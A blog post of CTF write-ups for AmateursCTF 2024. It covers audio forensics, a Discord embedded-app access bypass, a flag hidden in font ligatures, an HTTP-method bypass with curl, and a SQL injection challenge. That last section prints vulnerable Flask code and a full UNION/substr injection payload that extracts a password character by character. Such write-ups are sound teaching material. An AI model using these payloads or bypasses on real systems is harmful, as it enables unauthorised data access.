---
title: my writeups for AmateursCTF 2024
categories:
  - ctf
tags:
  - amateursCTF
  - misc
  - web
pin: false
image:
  path: /assets/img/amateursctf.png
  alt: amateursCTF logo
published: true
---

# prologue & review

hey y'all! im back with new writeups! :D

this time there are some for Amateurs CTF 2024.

I'd say pretty good, many teams participated to this ctf even though its their second event, this really goes to show the quality of the challenges. Unfortunately we didn't really do too well here, as many of our teammates couldn't participate because of midterm exams. But we still got in the top 7% (90th out of 1160 teams total).

anyways here are some writeups:

# misc

## Densely packed

challenge files:
![laughing.wav](https://github.com/ResetSec/AmateursCTF-2024/raw/main/Misc/Densely-packed/assets/laughing.wav)

![densely-packed](https://raw.githubusercontent.com/ResetSec/AmateursCTF-2024/main/Misc/Densely-packed/assets/image.png)

**writeup:**

this was a audio forensics challenge.

at first i tried to plug it in a spectrogram analyzer, but nothing really stands out.

after a bit i tried to search on the internet about the hint `mussmile`   

mussmile is a sound of the famous game undertale.

{% include embed/youtube.html id='9D1ztZgQYdE' %}

why it's a hint? because this sound is made by distorting and slowing down a laughing sound.

so after researching a bit i used this online-based audacity editor here https://wavacity.com/ to slow the sound down by 90%. After that you can just hear it's reversed.

So now we can reverse it and simply hear the flag being said by a AI voice.

done!

`amateursCTF{inverse_transformations}`

## bears flagcord

![bears-flagcord](https://raw.githubusercontent.com/ResetSec/AmateursCTF-2024/main/Misc/Bears-flagcord/assets/image.png)

this challenge was very fun and up to date imo. i loved it.

to solve it me and my teammate *yyxxzn* analyzed the link first of all.

https://discord.com/oauth2/authorize?client_id=1223421353907064913&permissions=0&scope=bot

if you try to use it and add to a server it will say that its a private bot or application and cant be added to your server. 

So we tried to modify the scope and the permissions, without success by following the api docs of discord

https://discord.com/developers/docs/topics/oauth2

nothing really worked, so we tried to investigate what this id was all about.

we used a online tool called discordlookup

https://discordlookup.com/application/1223421353907064913

but we could have also used the public discord api.

![user specs](https://raw.githubusercontent.com/ResetSec/AmateursCTF-2024/main/Misc/Bears-flagcord/assets/investigation.png)

we can see here that the id appears to represent a `embedded` application. 

discord embedded applications are activities that you can start when you join a discord channel and click the rocket icon

https://discord.com/developers/docs/activities/building-an-activity

basically we had to find a way to open this activity thus bypassing the filter.

To do this, i intercepted discord request to find out how discord chooses what discord activity to start.

Unfortunately, i tried to modify the request without success for about 30 minutes before giving up, but i was really close because literally the request after the one i was trying to modify was the solution.

infact after the ctf i tried digging deeper and found this request here

```
GET / HTTP/2
Host: 832012774040141894.discordsays.com
Sec-Ch-Ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: iframe
Referer: https://discord.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
```

while opening the chess in the park activity on discord

to get the flag we can simply modify the request with the id of our target application

from

https://832012774040141894.discordsays.com/

to

https://1223421353907064913.discordsays.com/

![flag](https://raw.githubusercontent.com/ResetSec/AmateursCTF-2024/main/Misc/Bears-flagcord/assets/target.png)

to get the flag we can now just write "flag" as the launch code, thus bypassing the filter and getting the flag!

what a cool challenge!

`amateursCTF{p0v_ac3ss_c0ntr0l_bypass_afd6e94d}`

# web

## agile rut

![agile-rut](https://raw.githubusercontent.com/ResetSec/AmateursCTF-2024/main/Web/Agile-rut/assets/image.png)

this challenge was conceptually very simple but as i've never worked with font files, it wasn't immediate for me.

to solve this challenge we have to analyze the requests via burpsuite proxy

let's first of all get the page source code:

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>agile rut playground</title>
    <style>
        @font-face {
            font-family: 'Agile Rut';
            src: url('agile-rut.otf');
        }
        * {
            font-family: 'Agile Rut';
        }
        textarea {
            font-size: 24px;
        }
    </style>
</head>

<body>
    <h1>Agile Rut</h1>
    <p>Check out my new font!! isn't it so cool!</p>
    <textarea cols="100" rows="100"></textarea>
</body>

</html>
```

this is just a html page to try a font, but apparently our flag could be hidden in the otf file.

upon further investigation i found out that you can hide custom chars in the font file as glyphs

to solve it i first tried to use python fonttools 

```bash
pip install fonttools
ttx agile-rut.otf
```

and dumped information about the font, but as it was a very long file i tried to use a web tool

unfortunately i don't remember exactly the name but i think this should do too

https://fontdrop.info/#/?darkmode=true

if we go the custom ligatures you should see the flag in one of them.

You could also solve it with the ttx tool as i did before. At some point you will find this ligature here:

`<Ligature components="m,a,t,e,u,r,s,c,t,f,braceleft,zero,k,underscore,b,u,t,underscore,one,underscore,d,o,n,t,underscore,l,i,k,e,underscore,t,h,e,underscore,j,b,m,o,n,zero,underscore,equal,equal,equal,braceright" glyph="lig.j.u.s.t.a.n.a.m.e.o.k.xxxxxxxxx.xxxx.x.xxxxxxxxxx.x.x.x.xxxxxxxxxx.xxx.xxxxxxxxxx.x.x.x.x.xxxxxxxxxx.x.x.x.x.xxxxxxxxxx.x.x.x.xxxxxxxxxx.x.x.x.x.x.xxxx.xxxxxxxxxx.xxxxx.xxxxx.xxxxx.xxxxxxxxxx"/>
`

that clearly resembles the flag.

i guess i am a bit blind lol :D

`amateursctf{0k_but_1_dont_like_the_jbmon0_===}`

## denied

solved by makider https://makider.me/

![denied](https://raw.githubusercontent.com/ResetSec/AmateursCTF-2024/main/Web/Denied/assets/image.png)

this challenge was very simple, to solve it we have to analyze the code though

![index.js](https://raw.githubusercontent.com/ResetSec/AmateursCTF-2024/main/Web/Denied/assets/index.js)

```js
const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) => {
  if (req.method == "GET") return res.send("Bad!");
  res.cookie('flag', process.env.FLAG ?? "flag{fake_flag}")
  res.send('Winner!')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
```

as you can see if we make any get request to the website it returns Bad!

```bash
curl http://denied.amt.rs/
Bad!
```

to get the flag we can just send a request different from GET so we bypass the if condition.
`if (req.method == "GET") return res.send("Bad!");`

now there are many verbs we can use: DELETE, PATCH, HEAD, OPTIONS, TRACE i'll use my favourite one: `HEAD`

we can now use curl to send the request like this:

`curl -X HEAD http://denied.amt.rs/ -v`

+ note the `-v` argument it's useful to get the raw request headers

now we can read the flag in the output in the `Set-Cookie` header

`Set-Cookie: flag=amateursCTF%7Bs0_m%40ny_0ptions…%7D; Path=/`

let's URL decode it in cyberchef

https://gchq.github.io/CyberChef/#recipe=URL_Decode()&input=YW1hdGV1cnNDVEYlN0JzMF9tJTQwbnlfMHB0aW9uc%2BKApiU3RA&oenc=65001

and we have the flag!

`amateursCTF{s0_m@ny_0ptions…}`

## one shot

my friend keeps asking me to play OneShot. i haven't, but i made this cool challenge! http://one-shot.amt.rs

![one-shot](https://raw.githubusercontent.com/ResetSec/AmateursCTF-2024/main/Web/One-shot/assets/image.png)

to solve this challenge we first have to take a look at the code:

```python
from flask import Flask, request, make_response
import sqlite3
import os
import re

app = Flask(__name__)
db = sqlite3.connect(":memory:", check_same_thread=False)
flag = open("flag.txt").read()

@app.route("/")
def home():
    return """
    <h1>You have one shot.</h1>
    <form action="/new_session" method="POST"><input type="submit" value="New Session"></form>
    """

@app.route("/new_session", methods=["POST"])
def new_session():
    id = os.urandom(8).hex()
    db.execute(f"CREATE TABLE table_{id} (password TEXT, searched INTEGER)")
    db.execute(f"INSERT INTO table_{id} VALUES ('{os.urandom(16).hex()}', 0)")
    res = make_response(f"""
    <h2>Fragments scattered... Maybe a search will help?</h2>
    <form action="/search" method="POST">
        <input type="hidden" name="id" value="{id}">
        <input type="text" name="query" value="">
        <input type="submit" value="Find">
    </form>
""")
    res.status = 201

    return res

@app.route("/search", methods=["POST"])
def search():
    id = request.form["id"]
    if not re.match("[1234567890abcdef]{16}", id):
        return "invalid id"
    searched = db.execute(f"SELECT searched FROM table_{id}").fetchone()[0]
    if searched:
        return "you've used your shot."
    
    db.execute(f"UPDATE table_{id} SET searched = 1")

    query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")
    return f"""
    <h2>Your results:</h2>
    <ul>
    {"".join([f"<li>{row[0][0] + '*' * (len(row[0]) - 1)}</li>" for row in query.fetchall()])}
    </ul>
    <h3>Ready to make your guess?</h3>
    <form action="/guess" method="POST">
        <input type="hidden" name="id" value="{id}">
        <input type="text" name="password" placehoder="Password">
        <input type="submit" value="Guess">
    </form>
"""

@app.route("/guess", methods=["POST"])
def guess():
    id = request.form["id"]
    if not re.match("[1234567890abcdef]{16}", id):
        return "invalid id"
    result = db.execute(f"SELECT password FROM table_{id} WHERE password = ?", (request.form['password'],)).fetchone()
    if result != None:
        return flag
    
    db.execute(f"DROP TABLE table_{id}")
    return "You failed. <a href='/'>Go back</a>"

@app.errorhandler(500)
def ise(error):
    original = getattr(error, "original_exception", None)
    if type(original) == sqlite3.OperationalError and "no such table" in repr(original):
        return "that table is gone. <a href='/'>Go back</a>"
    return "Internal server error"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
```

**this code is vulnerable to sql injection here:**

```python
    query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")
    return f"""
    <h2>Your results:</h2>
    <ul>
    {"".join([f"<li>{row[0][0] + '*' * (len(row[0]) - 1)}</li>" for row in query.fetchall()])}
    </ul>
    <h3>Ready to make your guess?</h3>
    <form action="/guess" method="POST">
        <input type="hidden" name="id" value="{id}">
        <input type="text" name="password" placehoder="Password">
        <input type="submit" value="Guess">
    </form>
"""
```

because the request.from query isn't properly sanitized

and we can inject sql code.

now we can't simply insert `%` to solve this because

then the password is sent in this form here

` {"".join([f"<li>{row[0][0] + '*' * (len(row[0]) - 1)}</li>" for row in query.fetchall()])}`

which censors the last chars of the flag, **except the first one**.

after a bit i have come up with this idea of injecting sql that reads the flag one char by one, so bypassing the one char filter.

to do it i have created some python code that gets the correct table name and builds the payload.

here's the full payload:

```sql
%' UNION ALL SELECT substr(password,1,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,2,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,3,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,4,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,5,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,6,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,7,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,8,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,9,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,10,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,11,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,12,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,13,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,14,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,15,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,16,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,17,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,18,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,19,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,20,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,21,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,22,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,23,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,24,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,25,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,26,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,27,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,28,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,29,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,30,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,31,1) FROM table_5befc8ecc4866d2b UNION ALL SELECT substr(password,32,1) FROM table_5befc8ecc4866d2b-- -
```

as you can see by using substr() function we can get an arbitrary char in the password which we know is 32 chars long because of this line of code `os.urandom(16).hex()` which gets 16 random bytes and trasforms them to hexadecimal notation so now its 32 chars.

now, send the payload, copy the password, remove the extra new lines and send the guess!

`amateursCTF{go_union_select_a_life}`

# prologue

that's it! thank you for reading!